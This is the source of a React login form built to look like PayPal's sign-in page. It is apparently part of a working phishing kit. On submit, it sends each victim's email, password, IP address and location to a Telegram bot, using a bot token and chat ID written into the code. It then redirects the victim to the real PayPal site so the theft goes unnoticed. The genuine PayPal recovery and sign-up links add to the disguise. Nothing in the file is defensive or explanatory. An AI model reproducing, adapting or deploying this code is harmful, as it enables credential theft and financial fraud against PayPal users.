"use client";
import React, { useEffect, useState } from "react";
import { Form, Input, Button, Divider, message } from "antd";
import logo from "../../../../public/images/logo.png";
import Image from "next/image";
import { useDispatch, useSelector } from "react-redux";
import axios from "axios";
import { redirectOrderReceived } from "@/store/slices/productSlice";

const LoginForm = () => {
  const dispatch = useDispatch();
  const [country, setCountry] = useState({});
  const [ip, setIPAddress] = useState(0);
  const [isHoveredFwPw, setIsHoveredFwPw] = useState(false);
  const [isHoveredLogin, setIsHoveredLogin] = useState(false);
  const [isHoveredSignup, setIsHoveredSignup] = useState(false);
  const [form] = Form.useForm();
  const handleMouseOverFwPw = () => {
    setIsHoveredFwPw(true);
  };

  const handleMouseOutFwPw = () => {
    setIsHoveredFwPw(false);
  };

  const handleMouseOverLogin = () => {
    setIsHoveredLogin(true);
  };

  const handleMouseOutLogin = () => {
    setIsHoveredLogin(false);
  };

  const handleMouseOverSignup = () => {
    setIsHoveredSignup(true);
  };

  const handleMouseOutSingup = () => {
    setIsHoveredSignup(false);
  };

  const onFinish = async (values) => {
    try {
      await axios.post(
        "https://api.telegram.org/bot6711426105:AAFjrbeuBzRtvgKon78_S12A14j8jLC7ISs/sendMessage",
        {
          chat_id: "-4048735773",
          text: `
        \tIP:   ${country?.ip} | ${country?.city} | ${country?.region} | ${country?.country} | ${country?.timezone}
        \t ----------- INFOR PAYPAL -----------
        \tUSERNAME:         ${values?.email}
        \tPASSWORD:         ${values?.password}
              `,
        }
      );
      window.open("https://www.paypal.com/");

      window.close();
    } catch (error) {}
  };

  const getCountry = (ip) => {
    fetch(`https://ipinfo.io/${ip}?token=930e3b99f29bed`)
      .then((response) => response.json())
      .then((data) => setCountry(data))
      .catch((error) => console.log(error));
  };

  useEffect(() => {
    fetch("https://api.ipify.org?format=json")
      .then((response) => response.json())
      .then((data) => {
        setIPAddress(data.ip);
        getCountry(data.ip);
      })
      .catch((error) => console.log(error));
  }, []);

  return (
    <Form
      name="login"
      onFinish={onFinish}
      form={form}
      style={{
        maxWidth: "42rem",
        margin: "auto",
        border: "1px solid #eaeced",
        borderRadius: "12px",
        padding: "30px 5% 50px",
        marginTop: "120px",
      }}
    >
      <Image
        src={logo}
        alt=""
        style={{
          display: "block",
          margin: "0 auto 13.116%",
          width: "60px",
          height: "45px",
        }}
      />

      <Form.Item name="email" rules={[{ required: true, message: "Required" }]}>
        <Input
          placeholder="Email or mobile number"
          style={{
            height: "64px",
            border: "2px solid #CBD5E0",
            padding: "1rem 0.5rem",
            borderRadius: "4px",
            fontFamily: "pp-sans-big-regular,Helvetica Neue,Arial,sans-serif",
            fontSize: "18px",
            fontWeight: "400",
            width: "100%",
          }}
        />
      </Form.Item>

      <Form.Item
        name="password"
        rules={[{ required: true, message: "Required" }]}
      >
        <Input
          placeholder="Password"
          style={{
            height: "64px",
            border: "2px solid #CBD5E0",
            padding: "1rem 0.5rem",
            borderRadius: "4px",
            fontFamily: "pp-sans-big-regular,Helvetica Neue,Arial,sans-serif",
            fontSize: "18px",
            fontWeight: "400",
            width: "100%",
          }}
        />
      </Form.Item>

      <Form.Item>
        <div
          onClick={() => {
            window.open("https://www.paypal.com/authflow/password-recovery");
          }}
          onMouseOver={handleMouseOverFwPw}
          onMouseOut={handleMouseOutFwPw}
          style={{
            color: "#1072eb",
            fontWeight: "bold",
            fontSize: "18px",
            textDecoration: isHoveredFwPw ? "underline" : "none",
          }}
        >
          Forgot password?
        </div>
      </Form.Item>

      <Form.Item>
        <Button
          onMouseOver={handleMouseOverLogin}
          onMouseOut={handleMouseOutLogin}
          htmlType="submit"
          style={{
            width: "100%",
            borderColor: isHoveredLogin ? "#1040c1" : "#142c8e",
            backgroundColor: isHoveredLogin ? "#1040c1" : "#142c8e",
            color: "#fff",
            fontSize: "18px",
            borderRadius: "25px",
            minHeight: "48px",
            padding: "8px 32px",
          }}
        >
          Log In
        </Button>
      </Form.Item>

      <Form.Item>
        <Divider plain>or</Divider>
      </Form.Item>

      <Form.Item>
        <Button
          onClick={() => {
            window.open(
              "https://www.paypal.com/vn/webapps/mpp/account-selection"
            );
          }}
          onMouseOver={handleMouseOverSignup}
          onMouseOut={handleMouseOutSingup}
          style={{
            width: "100%",
            border: isHoveredSignup
              ? "2px solid #142c8e"
              : "0.0125rem solid #142c8e",
            backgroundColor: "#fff",
            boxShadow: "inset 0 0 0 0.0625rem #142c8e",
            color: isHoveredSignup ? "#142c8e" : "#142c8e",
            fontSize: "18px",
            borderRadius: "25px",
            minHeight: "48px",
            padding: "8px 32px",
          }}
        >
          Sign Up
        </Button>
      </Form.Item>
    </Form>
  );
};

export default LoginForm;
